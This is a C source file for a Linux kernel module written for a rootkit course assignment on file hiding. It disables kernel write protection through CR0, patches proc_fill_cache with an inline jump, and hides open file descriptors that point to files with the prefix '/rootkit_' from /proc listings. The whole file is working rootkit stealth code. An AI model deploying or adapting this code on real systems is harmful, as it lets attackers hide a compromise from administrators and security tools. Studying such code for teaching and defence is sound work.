/*
 *  Assignment 4
 *  File Hiding
 *
 *  Requirements:
 *     a) Pick a suitable prefix (for instance rootkit_). Hide files with this
 *         predefined prefix from the user when listing directories
 *     b) Hide the opened file descriptors that point to a hidden file from /proc/<pid>/
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/delay.h>
#include <linux/reboot.h>
#include <linux/moduleparam.h>
#include <linux/fs.h>
#include <linux/pid_namespace.h>
#include <linux/ptrace.h>

#include <asm/paravirt.h>

#include "sysmap.h"
#include "proc_internal.h"

/* handle at most 10 inputs once */
int pid[10];
int var_count = 0;
module_param_array(pid, int, &var_count, 0000);

void disable_ro(void)
{
    write_cr0(read_cr0() & ~X86_CR0_WP);
    barrier();
}

void enable_ro(void)
{
    write_cr0(read_cr0() | X86_CR0_WP);
    barrier();
}

#define syscalls ((void**)SM_sys_call_table)

int (*asmlinkage old_read_func)(int fd, void* buf, size_t count);

atomic_t active_read_calls = ATOMIC_INIT(0);

bool fake__proc_fill_cache( struct file *file,
                            struct dir_context *ctx,
                            const char *name,
                            int len,
                            instantiate_t instantiate,
                            struct task_struct *task,
                            const void *ptr )
{
    struct dentry *child, *dir = file->f_path.dentry;
    struct qstr qname = QSTR_INIT(name, len);
    struct inode *inode;
    unsigned type;
    ino_t ino;
    bool ret, trigger = false, kill = false;
    char textbuf[32];
    struct path path;
    char* tmp, * pathname;

    atomic_inc(&active_read_calls);

    snprintf(textbuf, sizeof(textbuf), "%d", (int)(long long)ptr);
    if ((strcmp(name, textbuf) == 0)) // && (task->tgid == 17643))
    {
        trigger = true;
    }

    child = d_hash_and_lookup(dir, &qname);
    if (!child) {
        child = d_alloc(dir, &qname);
        if (!child)
            goto end_instantiate;
        if (instantiate(d_inode(dir), child, task, ptr) < 0) {
            dput(child);
            goto end_instantiate;
        }
    }

    if (trigger)
    {
        if (PROC_I(d_inode(child))->op.proc_get_link(child, &path)) printk(KERN_INFO "errer\n");
        else
        {
            tmp = (char*)__get_free_page(GFP_TEMPORARY);
            if (tmp)
            {
                pathname = d_path(&path, tmp, PAGE_SIZE - 1);
                if (!IS_ERR(pathname))
                {
                    tmp[PAGE_SIZE - 1] = '\0';
                    if (strstr(pathname, "/rootkit_"))
                    {
                        kill = true;
                    }
                }

                free_page((unsigned long)tmp);
            }
        }
    }

    inode = d_inode(child);
    ino = inode->i_ino;
    type = inode->i_mode >> 12;
    dput(child);
    ret = kill ? true : dir_emit(ctx, name, len, ino, type);
    goto gtfo;

end_instantiate:
    ret = dir_emit(ctx, name, len, 1, DT_UNKNOWN);

gtfo:
    atomic_dec(&active_read_calls);
    return ret;
}

uint8_t func_backup[12];

void hook(void)
{
    uint8_t* p;

    disable_ro();
    p = (uint8_t*)SM_proc_fill_cache;
    memcpy(func_backup, p, sizeof(func_backup));
    p[0] = 0x48;
    p[1] = 0xb8;
    *(void**)(p + 2) = fake__proc_fill_cache;
    p[10] = 0xff;
    p[11] = 0xe0;
    enable_ro();
}

void unhook(void)
{
    disable_ro();
    memcpy(SM_proc_fill_cache, func_backup, sizeof(func_backup));
    enable_ro();
}

int init_module(void){
    printk(KERN_INFO "File_hiding loaded.\n");

    hook();

    return 0;
}

void cleanup_module(void){
    printk(KERN_INFO "File_hiding unloaded.\n");

    unhook();
    // Prevent other CPUs from crashing due to running unloaded code
    // Not too pretty but should be fine
    while (atomic_read(&active_read_calls) != 0)
        msleep(100);

    return;
}

